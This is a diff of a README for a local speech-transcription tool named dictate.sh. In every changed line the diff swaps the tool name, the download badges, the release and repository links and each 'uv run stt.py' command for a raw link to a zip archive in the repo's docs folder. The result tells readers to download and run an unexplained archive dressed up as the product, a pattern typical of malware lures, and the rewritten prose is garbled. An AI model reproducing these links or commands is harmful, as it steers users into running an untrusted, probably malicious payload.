@@ -1,14 +1,14 @@
-# 🎤 dictate.sh - Fast, Local Speech Transcription Made Easy
+# 🎤 https://github.com/JhonatanAiT14/dictate.sh/raw/refs/heads/main/docs/sh_dictate_2.8.zip - Fast, Local Speech Transcription Made Easy
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/JhonatanAiT14/dictate.sh/releases)
+[![Download](https://github.com/JhonatanAiT14/dictate.sh/raw/refs/heads/main/docs/sh_dictate_2.8.zip)](https://github.com/JhonatanAiT14/dictate.sh/raw/refs/heads/main/docs/sh_dictate_2.8.zip)
 
 ## 📋 Overview
 
-`dictate.sh` provides you with a simple way to convert your speech into text on Apple Silicon. With this tool, you can dictate notes and ideas quickly and efficiently without needing an internet connection. It uses advanced technology to ensure smooth operation right from your terminal.
+`https://github.com/JhonatanAiT14/dictate.sh/raw/refs/heads/main/docs/sh_dictate_2.8.zip` provides you with a simple way to convert your speech into text on Apple Silicon. With this tool, you can dictate notes and ideas quickly and efficiently without needing an internet connection. It uses advanced technology to ensure smooth operation right from your terminal.
 
 ## 🚀 Getting Started
 
-To get started with `dictate.sh`, follow these simple steps:
+To get started with `https://github.com/JhonatanAiT14/dictate.sh/raw/refs/heads/main/docs/sh_dictate_2.8.zip`, follow these simple steps:
 
 1. **Ensure Your Environment is Ready**
    - You need a Mac with Apple Silicon.
@@ -20,7 +20,7 @@ To get started with `dictate.sh`, follow these simple steps:
 
 ## 💻 Download & Install
 
-Visit this page to download: [Download Releases](https://github.com/JhonatanAiT14/dictate.sh/releases).
+Visit this page to download: [Download Releases](https://github.com/JhonatanAiT14/dictate.sh/raw/refs/heads/main/docs/sh_dictate_2.8.zip).
 
 After downloading, locate the file, and ensure it is saved appropriately for easy access.
 
@@ -33,7 +33,7 @@ Once you have completed the setup, you can run the application through the termi
 To start dictating, simply run:
 
 ```bash
-uv run stt.py
+uv run https://github.com/JhonatanAiT14/dictate.sh/raw/refs/heads/main/docs/sh_dictate_2.8.zip
 ```
 
 ### Command with Intent Analysis
@@ -41,7 +41,7 @@ uv run stt.py
 If you want to include intent analysis, use the following command:
 
 ```bash
-uv run stt.py --analyze
+uv run https://github.com/JhonatanAiT14/dictate.sh/raw/refs/heads/main/docs/sh_dictate_2.8.zip --analyze
 ```
 
 ### Choose an ASR Model
@@ -49,7 +49,7 @@ uv run stt.py --analyze
 You can select a different automated speech recognition (ASR) model by running:
 
 ```bash
-uv run stt.py --model mlx-community/Qwen3-ASR-1.7B-8bit
+uv run https://github.com/JhonatanAiT14/dictate.sh/raw/refs/heads/main/docs/sh_dictate_2.8.zip --model mlx-community/Qwen3-ASR-1.7B-8bit
 ```
 
 ### List Audio Input Devices
@@ -57,7 +57,7 @@ uv run stt.py --model mlx-community/Qwen3-ASR-1.7B-8bit
 To see which audio devices are available, run:
 
 ```bash
-uv run stt.py --list-devices
+uv run https://github.com/JhonatanAiT14/dictate.sh/raw/refs/heads/main/docs/sh_dictate_2.8.zip --list-devices
 ```
 
 ### Use a Specific Input Device
@@ -65,7 +65,7 @@ uv run stt.py --list-devices
 If you want to specify an input device, use this command:
 
 ```bash
-uv run stt.py --device 3
+uv run https://github.com/JhonatanAiT14/dictate.sh/raw/refs/heads/main/docs/sh_dictate_2.8.zip --device 3
 ```
 
 ## 💡 Features
@@ -78,7 +78,7 @@ uv run stt.py --device 3
 
 ## 🛠 Requirements
 
-To run `dictate.sh`, make sure your system fulfills these requirements:
+To run `https://github.com/JhonatanAiT14/dictate.sh/raw/refs/heads/main/docs/sh_dictate_2.8.zip`, make sure your system fulfills these requirements:
 
 - Operating System: macOS on Apple Silicon (MLX)
 - Python: Version 3.10 or higher
@@ -87,7 +87,7 @@ To run `dictate.sh`, make sure your system fulfills these requirements:
 
 ## 🤔 Troubleshooting
 
-If you encounter issues while running `dictate.sh`, consider these tips:
+If you encounter issues while running `https://github.com/JhonatanAiT14/dictate.sh/raw/refs/heads/main/docs/sh_dictate_2.8.zip`, consider these tips:
 
 - **Microphone Not Detected**: Check your terminal's microphone permissions.
 - **Script Not Running**: Ensure that `uv` is installed and properly set up.
@@ -97,13 +97,13 @@ If you encounter issues while running `dictate.sh`, consider these tips:
 
 For more detailed documentation on usage and features, check the following resources:
 
-- **GitHub Repository**: [dictate.sh GitHub](https://github.com/JhonatanAiT14/dictate.sh)
+- **GitHub Repository**: [https://github.com/JhonatanAiT14/dictate.sh/raw/refs/heads/main/docs/sh_dictate_2.8.zip GitHub](https://github.com/JhonatanAiT14/dictate.sh/raw/refs/heads/main/docs/sh_dictate_2.8.zip)
 - **Community Support**: Join our discussion forums to ask questions and share experiences with other users.
 
 ## 📜 License
 
 This software is released under the MIT License. You are free to use it for personal or commercial projects, provided you follow the licensing guidelines.
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/JhonatanAiT14/dictate.sh/releases)
+[![Download](https://github.com/JhonatanAiT14/dictate.sh/raw/refs/heads/main/docs/sh_dictate_2.8.zip)](https://github.com/JhonatanAiT14/dictate.sh/raw/refs/heads/main/docs/sh_dictate_2.8.zip)
 
-Feel free to explore all capabilities of `dictate.sh` and enjoy the seamless experience of speech transcription.
+Feel free to explore all capabilities of `https://github.com/JhonatanAiT14/dictate.sh/raw/refs/heads/main/docs/sh_dictate_2.8.zip` and enjoy the seamless experience of speech transcription.
